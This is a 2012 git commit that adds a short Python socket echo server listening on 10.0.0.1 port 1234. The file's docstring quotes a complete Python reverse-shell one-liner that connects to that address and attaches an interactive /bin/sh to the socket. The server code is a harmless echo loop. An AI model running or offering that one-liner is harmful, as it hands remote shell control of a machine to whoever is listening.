3af887ce5af7d173049e395b506b69ae7f93d2a1
bigsnarfdude <ohprecio@gmail.com>
2012-11-05 09:53:18 -0500

    first

---
+++ simple_socket_server.py
@@ -0,0 +1,23 @@
+#!/usr/bin/env python
+
+"""
+A simple echo server similar to the python connect back on liner
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+"""
+
+import socket
+
+host = '10.0.0.1'
+port = 1234
+backlog = 5
+size = 1024
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.bind((host,port))
+s.listen(backlog)
+while 1:
+    client, address = s.accept()
+    data = client.recv(size)
+    if data:
+        client.send(data)
+    client.close()
